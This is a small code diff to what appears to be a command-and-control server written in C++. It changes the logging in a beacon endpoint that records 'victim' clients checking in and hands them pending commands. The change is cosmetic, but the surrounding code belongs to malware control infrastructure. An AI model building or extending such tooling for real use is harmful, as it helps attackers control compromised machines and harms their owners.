@@ -3,6 +3,7 @@
 #include "Beacon.hpp"
 #include "Endpoints.hpp"
 #include "LogDAO.hpp"
+#include "Logger.hpp"
 #include <string>
 #include <vector>
 #include <chrono>
@@ -31,7 +32,7 @@ inline void register_beacon_endpoint(cpppwn::RESTServer& server) {
                 return error_response(400, "Invalid beacon format");
             }
 
-            std::println("Client: {} is checking in...", beacon.victim_uid);
+            logger::info("Client: {} is checking in...", beacon.victim_uid);
 
             // 1. Determine External IP from the socket if "auto" was sent
             std::string effective_ip = beacon.external_ip;
@@ -77,7 +78,7 @@ inline void register_beacon_endpoint(cpppwn::RESTServer& server) {
             // 4. Fetch Pending Commands (status 0)
             auto command_list = commands.get_repo()->get_for_client(beacon.victim_uid);
 
-            std::println("Amount of commands #{}", command_list.size());
+            logger::info("Amount of commands #{}", command_list.size());
 
             // 5. Mark commands as sent
             for (auto& cmd : command_list) {
